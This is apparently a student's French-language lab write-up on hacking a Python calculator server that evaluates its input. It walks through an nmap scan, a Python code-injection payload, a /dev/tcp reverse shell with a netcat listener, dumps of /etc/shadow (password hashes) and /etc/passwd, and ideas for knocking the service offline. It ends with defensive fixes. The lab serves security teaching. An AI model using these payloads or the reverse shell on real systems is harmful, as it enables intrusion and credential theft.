# TP5 SECU : Exploit, pwn, fix
## 1. Reconnaissance
**🌞 Déterminer :**
IP : 10.1.1.2
Port : 13337
Wireshark ou un décompileur
**🌞 Scanner le réseau :**
```
nanouche@Ubuntu:~$ sudo nmap -p 13337 --scanflags SYN -sS 10.33.64.0/20 -oN scan
```
Résultat dans le dossier [scan](./scan)
[tp5_nmap.pcapng](./capture/tp5_nmap.pcapng)
**🌞 Connectez-vous au serveur :**
```
nanouche@Ubuntu:~$ sudo python3 client.py 
Veuillez saisir une opération arithmétique : 1+1
'2'
```
L'application est une calculatrice
## 2. Exploit
**🌞 Injecter du code serveur :**
```
nanouche@Ubuntu:~$ nc 10.33.72.148 13337
__import__('os').popen("ls").read()
afs
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```
## 3. Reverse shell
**🌞 Obtenez un reverse shell sur le serveur :**
```
nanouche@Ubuntu:~$ nc 10.33.72.148 13337
__import__('os').popen("sh -i >& /dev/tcp/10.33.72.147/9999 0>&1").read()

nanouche@Ubuntu:~$ nc -lvp 9999
Listening on 0.0.0.0 9999
Connection received on 10.33.72.148 49297
sh: cannot set terminal process group (11456): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.1# 
```
**🌞 Pwn :**
```
sh-5.1# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:e4:0d:99 brd ff:ff:ff:ff:ff:ff
    inet 10.1.1.10/24 brd 10.1.1.255 scope global noprefixroute enp0s3
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fee4:d99/64 scope link 
       valid_lft forever preferred_lft forever
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:a0:7b:1f brd ff:ff:ff:ff:ff:ff
    inet 10.0.3.15/24 brd 10.0.3.255 scope global dynamic noprefixroute enp0s8
       valid_lft 80092sec preferred_lft 80092sec
    inet6 fe80::a00:27ff:fea0:7b1f/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever

sh-5.1# cat etc/shadow
cat etc/shadow
root:$6$zEk1UBcRHlrijLhs$/1dzLO/IL.CSZuDFqhGsfwqMWLqcEqANgi/zoptiNyztK3PKX4uX.TBRaoaZ120sTVCT7awPUUF3s62Hs2yfN.::0:99999:7:::
bin:*:19469:0:99999:7:::
daemon:*:19469:0:99999:7:::
adm:*:19469:0:99999:7:::
lp:*:19469:0:99999:7:::
sync:*:19469:0:99999:7:::
shutdown:*:19469:0:99999:7:::
halt:*:19469:0:99999:7:::
mail:*:19469:0:99999:7:::
operator:*:19469:0:99999:7:::
games:*:19469:0:99999:7:::
ftp:*:19469:0:99999:7:::
nobody:*:19469:0:99999:7:::
systemd-coredump:!!:19653::::::
dbus:!!:19653::::::
tss:!!:19653::::::
sssd:!!:19653::::::
sshd:!!:19653::::::
chrony:!!:19653::::::
systemd-oom:!*:19653::::::
hugo:$6$Y5.0u9zww/X1I33x$PZxU8Ghsb7UOgEpRgjWERYj/Un58bEOig3MYF90y5fo9H.X5sZ6qluhSKqxekAPkwMU6sxw3fn.Z1TZ2bVrdF/::0:99999:7:::
tcpdump:!!:19653::::::
netdata:!!:20014::::::

sh-5.1# cat etc/passwd
cat etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
sssd:x:998:995:User for sssd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
chrony:x:997:994:chrony system user:/var/lib/chrony:/sbin/nologin
systemd-oom:x:992:992:systemd Userspace OOM Killer:/:/usr/sbin/nologin
hugo:x:1000:1000:hugo:/home/hugo:/bin/bash
tcpdump:x:72:72::/:/sbin/nologin
netdata:x:991:991:NetData User:/var/log/netdata:/sbin/nologin

sh-5.1# cat home/hugo/client.py
cat home/hugo/client.py
#!/usr/bin/python3.9

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
s.send('Hello'.encode())

# On reçoit la string Hello
data = s.recv(1024)

# Récupération d'une string utilisateur
msg = input("Calcul à envoyer: ")

# On envoie
s.send(msg.encode())

# Réception et affichage du résultat
s_data = s.recv(1024)
print(s_data.decode())
s.close()

sh-5.1# cat home/hugo/portcheck.conf
cat home/hugo/portcheck.conf
jobs:
  - name: calculatrice
    host: 127.0.0.1
    ports:
      - 9999
```
## 4. Bonus : DOS
**⭐ BONUS : DOS l'application :**  
- Sur le firewall fermer le port 9999.
- Désinstaller Python de la machine.
- Supprimer le dossier home/hugo ou est stocké le .py et le .conf.
- time sleep la machine.
- Shutdown la machine.
# II. Remédiation
**🌞 Proposer une remédiation dév :**
- Valider et uniquement autoriser des entrées de int ou de +-*/.

**🌞 Proposer une remédiation système :**
- Limiter les permissions de l'application et définir un user avec les permissions les plus petites possibles pour juste faire sa tache et rien d'autre.
- Isoler l'application dans un conteneur Docker.